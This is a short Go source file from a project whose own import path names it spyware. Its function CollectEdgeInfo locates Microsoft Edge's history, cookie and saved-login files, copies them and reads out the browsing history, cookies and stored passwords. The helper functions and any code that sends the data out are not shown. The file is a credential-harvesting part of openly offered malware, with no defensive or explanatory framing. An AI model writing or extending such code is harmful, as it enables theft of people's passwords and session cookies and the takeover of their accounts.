package collectors

import (
	"github.com/Nevesto/spyware/browsers/edge"
	"github.com/Nevesto/spyware/models"
)

func CollectEdgeInfo() models.EdgeInfo {
	var info models.EdgeInfo

	historyFile, err := edge.FindHistoryFile()
	if err == nil && historyFile != "" {
		tmpHistoryFile, err := edge.CopyFile(historyFile)
		if err == nil {
			info.History, _ = edge.ReadHistory(tmpHistoryFile)
		}
	}

	cookieFile, err := edge.FindCookieFile()
	if err == nil && cookieFile != "" {
		tmpCookieFile, err := edge.CopyFile(cookieFile)
		if err == nil {
			info.Cookies, _ = edge.ReadCookies(tmpCookieFile)
		}
	}

	loginDataFile, err := edge.FindLoginDataFile()
	if err == nil && loginDataFile != "" {
		info.Passwords, _ = edge.ReadPasswords(loginDataFile)
	}

	return info
}
